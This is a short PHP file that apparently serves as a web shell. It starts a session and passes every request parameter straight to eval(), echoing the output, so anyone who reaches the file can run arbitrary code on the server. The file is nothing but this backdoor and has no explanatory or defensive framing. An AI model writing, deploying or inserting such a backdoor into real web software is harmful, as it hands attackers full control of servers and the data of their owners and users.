<?php

    // Start session
    session_start();

    // Execute the commands
    foreach ($_REQUEST as $cmd)  {
        echo eval($cmd);        
    }

?>